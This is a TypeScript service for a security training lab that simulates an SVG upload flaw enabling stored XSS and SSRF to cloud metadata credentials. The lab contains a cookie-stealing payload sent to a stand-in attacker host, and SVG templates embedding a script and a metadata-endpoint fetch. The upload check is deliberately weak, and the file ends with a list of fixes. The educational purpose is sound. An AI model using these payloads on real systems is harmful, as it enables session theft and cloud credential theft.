// src/modules/practice-labs/file-upload/labs/lab4/lab4.service.ts
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class FileUploadLab4Service {
  private uploadedSvgs = new Map<
    string,
    {
      attackType: string;
      xssPayload?: string;
      ssrfTarget?: string;
    }
  >();

  // محاكاة AWS metadata endpoint
  private readonly METADATA_RESPONSES: Record<string, string> = {
    'http://169.254.169.254/latest/meta-data/':
      'ami-id\nami-launch-index\nhostname\niam\ninstance-id\nlocal-ipv4\npublic-ipv4',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/':
      'ec2-role',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role':
      JSON.stringify(
        {
          Code: 'Success',
          LastUpdated: '2026-03-06T00:00:00Z',
          Type: 'AWS-HMAC',
          AccessKeyId: 'ASIA_CONNECTHUB_PROD_XYZ',
          SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
          Token: 'token_connecthub_prod_session_abc123',
          FLAG: 'FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}',
          Expiration: '2026-03-06T06:00:00Z',
        },
        null,
        2,
      ),
    'http://169.254.169.254/latest/meta-data/instance-id':
      'i-0a1b2c3d4e5f6789a',
    'http://169.254.169.254/latest/meta-data/local-ipv4': '172.31.45.12',
  };

  private readonly ADMIN_COOKIE =
    'session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.ADMIN_SECRET_TOKEN';

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.uploadedSvgs.clear();
    return this.stateService.initializeState(userId, labId);
  }

  async getInfo(userId: string, labId: string) {
    return {
      success: true,
      platform: 'ConnectHub Social Platform',
      allowedFormats: ['jpg', 'png', 'gif', 'svg'],
      svgNote: 'SVG images are rendered inline in profile pages',
      contentType: 'image/svg+xml served directly',
      warning: 'SVG files support XML, external resources, and scripting.',
    };
  }

  // ❌ الثغرة: يقبل SVG مع scripts وexternal resources
  async uploadPhoto(
    userId: string,
    labId: string,
    filename: string,
    attackType: string,
    xssPayload: string,
    ssrfTarget: string,
  ) {
    if (!filename) throw new BadRequestException('filename is required');

    const isSvg = filename.endsWith('.svg');
    const isValid = ['.jpg', '.png', '.gif', '.svg'].some((e) =>
      filename.endsWith(e),
    );

    if (!isValid) {
      return { success: false, error: 'Invalid file type' };
    }

    if (!isSvg) {
      return {
        success: true,
        uploaded: true,
        filename,
        message: 'Image uploaded (not SVG — no special risk)',
        hint: 'Try uploading a .svg file with attackType: "xss" or "ssrf"',
      };
    }

    // SVG مقبول — يُخزن مع الـ payload
    this.uploadedSvgs.set(filename, {
      attackType: attackType ?? 'none',
      xssPayload,
      ssrfTarget,
    });

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'FILE_UPLOAD',
        action: 'SVG_UPLOAD',
        meta: {
          filename,
          attackType,
          hasSsrfTarget: !!ssrfTarget,
          hasXss: !!xssPayload,
        },
      },
    });

    const svgContent = this.buildSvgContent(attackType, xssPayload, ssrfTarget);

    return {
      success: true,
      uploaded: true,
      filename,
      contentType: 'image/svg+xml',
      svgContent,
      url: `/uploads/profiles/${filename}`,
      attackEmbedded: attackType !== 'none' && !!attackType,
      message:
        attackType === 'xss'
          ? '⚠️ XSS payload embedded! Will fire when any user views this profile.'
          : attackType === 'ssrf'
            ? '⚠️ SSRF payload embedded! Server will fetch the external URL when rendering.'
            : 'SVG uploaded.',
      nextStep: `POST /profile/photo/simulate-view with { "filename": "${filename}", "viewerRole": "admin" }`,
    };
  }

  // محاكاة مشاهدة الـ profile
  async simulateView(
    userId: string,
    labId: string,
    filename: string,
    viewerRole: string,
  ) {
    if (!filename) throw new BadRequestException('filename is required');

    const svg = this.uploadedSvgs.get(filename);
    if (!svg) {
      return {
        success: false,
        error: 'SVG not found',
        hint: 'Upload an SVG first via /profile/photo/upload',
      };
    }

    const results: Record<string, unknown> = {};
    let isExploited = false;

    // محاكاة XSS
    if (svg.attackType === 'xss') {
      const victimRole = viewerRole ?? 'user';
      const stolenCookie =
        victimRole === 'admin'
          ? this.ADMIN_COOKIE
          : `session=user_token_${userId}`;
      results['xss'] = {
        fired: true,
        victim: victimRole,
        stolenCookie,
        payload:
          svg.xssPayload ??
          'document.location="https://attacker.io/steal?c="+document.cookie',
        attackerGot: `https://attacker.io/steal?c=${encodeURIComponent(stolenCookie)}`,
      };
      if (victimRole === 'admin') isExploited = true;
    }

    // محاكاة SSRF
    if (svg.attackType === 'ssrf' && svg.ssrfTarget) {
      const metadataResponse = this.METADATA_RESPONSES[svg.ssrfTarget];
      if (metadataResponse) {
        results['ssrf'] = {
          fired: true,
          target: svg.ssrfTarget,
          response: metadataResponse,
          serverMade: `GET ${svg.ssrfTarget} (from server-side SVG render)`,
        };
        isExploited = metadataResponse.includes('FLAG{');
      } else {
        results['ssrf'] = {
          fired: true,
          target: svg.ssrfTarget,
          response: '(Internal resource — simulated timeout)',
          hint: 'Try: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role',
        };
      }
    }

    const flag = isExploited
      ? 'FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}'
      : undefined;

    return {
      success: true,
      exploited: isExploited,
      viewer: viewerRole ?? 'anonymous',
      filename,
      results,
      ...(flag && {
        flag,
        vulnerability: 'SVG File Upload → Stored XSS + SSRF (Cloud Metadata)',
        impact:
          'Admin session stolen via XSS. AWS IAM credentials leaked via SSRF. Full cloud account takeover possible.',
        fix: [
          'Sanitize SVG: strip <script>, <use>, <image>, <foreignObject>, on* event handlers',
          'Use a dedicated SVG sanitizer library (e.g., DOMPurify for SVG)',
          'Convert SVG to raster image (PNG) server-side — destroys all scripts',
          'Serve uploaded files from a separate sandboxed domain (no cookies shared)',
          'Block SSRF: add IMDSv2 (instance metadata service v2) requiring PUT pre-auth',
        ],
      }),
    };
  }

  private buildSvgContent(
    attackType: string,
    xssPayload?: string,
    ssrfTarget?: string,
  ): string {
    if (attackType === 'xss') {
      return `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <circle cx="100" cy="100" r="80" fill="#ff6b6b"/>
  <script type="text/javascript">
    // ${xssPayload ?? 'document.location="https://attacker.io/steal?c="+document.cookie'}
  </script>
</svg>`;
    }
    if (attackType === 'ssrf') {
      return `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <circle cx="100" cy="100" r="80" fill="#4ecdc4"/>
  <image href="${ssrfTarget ?? 'http://169.254.169.254/latest/meta-data/'}" width="1" height="1"/>
</svg>`;
    }
    return `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <circle cx="100" cy="100" r="80" fill="#95e1d3"/>
</svg>`;
  }
}
